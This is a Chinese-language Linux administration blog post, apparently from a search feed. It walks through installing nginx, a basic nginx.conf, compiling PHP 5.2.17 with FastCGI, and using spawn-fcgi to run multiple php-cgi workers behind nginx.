<p>检查安装时会显示：<br>nginx path prefix: “/usr/local/nginx”                                 —-nginx安装路径<br>nginx binary file: “/usr/local/nginx/sbin/nginx”                      —-nginx启动脚本<br>nginx configuration prefix: “/usr/local/nginx/conf”                   —-nginx配置文件所在位置<br>nginx configuration file: “/usr/local/nginx/conf/nginx.conf”    —-nginx配置文件<br>nginx pid file: “/var/run/nignx/nginx.pid”<br>nginx error log file: “/var/log/nginx/error.log”<br>nginx http access log file: “/var/log/nginx/access.log”<br>nginx http client request body temporary files: “/tmp/nginx”<br>nginx http proxy temporary files: “/tmp/nginx”<br>nginx http fastcgi temporary files: “/tmp/nginx”<br><strong>apache和nginx通信机制对比：</strong><br>apache  –&gt;  mod_libphp5.so   –&gt; /usr/local/bin/php  –&gt;  php.ini -&gt; socket -&gt; mysql<br>nginx   –&gt;  tcp/ip  -&gt;  /usr/local/bin/php-fcgi -&gt; php.ini -&gt; tcp/ip -&gt; mysql<br><strong>nginx简单配置：</strong><br>vim /usr/local/nginx/conf/nginx.conf<br>user  daemon;<br>worker_processes  5;                                          打开的进程数量<br>error_log  /var/log/nginx/error.log  info;<br>pid        /var/run/nginx/nginx.pid;<br>events {<br>worker_connections  1024;                       并发连接数量<br>}<br>http {<br>include       mime.types;<br>default_type  application/octet-stream;<br>log_format  main  ‘$remote_addr - $remote_user [$time_local] “$request” ‘<br>‘$status $body_bytes_sent “$http_referer” ‘<br>‘“$http_user_agent” “$http_x_forwarded_for”‘;<br>access_log    /var/log/nginx/access.log  main;<br>sendfile        on;                                       允许文件上传<br>keepalive_timeout  65;</p>
<p>server {<br>listen       80;<br>server_name  www.cluster.com;<br>charset gb2312;<br>access_log  /var/log/nginx/www.access.log  main;<br>location / {<br>root   /www;<br>index  index.html index.htm index.php;<br>}<br>error_page   500 502 503 504  /50x.html;                定义错误代码<br>location = /50x.html {<br>root   html;<br>}<br>}<br>}</p>
<p>检查nginx.conf配置文件是否有语法错误<br>[root@station10 nginx-1.0.9]# /usr/local/nginx/sbin/nginx -t</p>
<p>nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok<br>nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful</p>
<p>[root@station10 nginx-1.0.9]# /usr/local/nginx/sbin/nginx                  &lt;- 启动服务器<br>[root@station10 nginx-1.0.9]# /usr/local/nginx/sbin/nginx -s stop          &lt;- 关闭服务器<br><strong>2.编译安装php-5.2.17</strong><br>./configure –enable-fastcgi –enable-force-cgi-redirect –disable-ipv6 –with-libxml-dir=/usr –with-openssl –with-zlib –with-bz2<br>–enable-calendar –with-curl –with-curlwrappers –with-pcre-dir=/usr/local –enable-ftp –with-gd=/usr/local<br>–with-jpeg-dir=/usr/local –with-png-dir=/usr/local –with-xpm-dir –with-freetype-dir=/usr/local –enable-gd-native-ttf<br>–enable-gd-jis-conv –enable-mbstring –with-mcrypt=/usr/local –with-mhash=/usr/local –with-mysql=/usr/local/mysql<br>–with-mysql-sock=/var/run/mysqld/mysql5.socket –with-mysqli=/usr/local/mysql/bin/mysql_config –with-ncurses=/usr<br>–with-snmp=/usr –enable-zip  –enable-sockets</p>
<p>编译之后会生成/usr/local/bin/php-cgi  此为连接nginx和php的工具</p>
<p>一般情况下并发访问不大的时候：<br>启动 tcp -&gt;开启9000端口，用于连接nginx和php<br>/usr/local/bin/php-cgi -b 127.0.0.1:9000 -c /usr/local/lib/php.ini -a &amp;</p>
<p>在虚拟主机中增加<br>location ~ .php$ {<br>root           /www;<br>fastcgi_pass   127.0.0.1:9000;<br>fastcgi_index  index.php;<br>fastcgi_param  SCRIPT_FILENAME  /www$fastcgi_script_name;<br>include        fastcgi_params;<br>}</p>
<p>接下来重启nginx，就可以支持php，php与mysql的连接通过php.ini定义mysql的socket来实现<br><strong>注意：</strong><br>当并发访问非常大的时候，此时/usr/local/bin/php-cgi就会由于压力而死掉，但nginx可能还会正常工作，<br>依然能解释静态页面，而php页面将不被解析！<br><strong>解决方法：</strong><br>为保持php的稳定性，使用spawn-fcgi-1.6.3.tar.gz产蛋工具，可以解决此问题</p>
<p>spawn-fcgi-1.6.3.tar.gz<br>./configure –enable-extra-warnings&amp;&amp; make &amp;&amp; make install</p>
<p>/usr/local/bin/spawn-fcgi -a 127.0.0.1 -p 9000 -C 200 -f /usr/local/bin/php-cgi -u daemon -g daemon<br>-将会生成200个/usr/local/bin/php-cgi后台进程</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
  
  
</search>
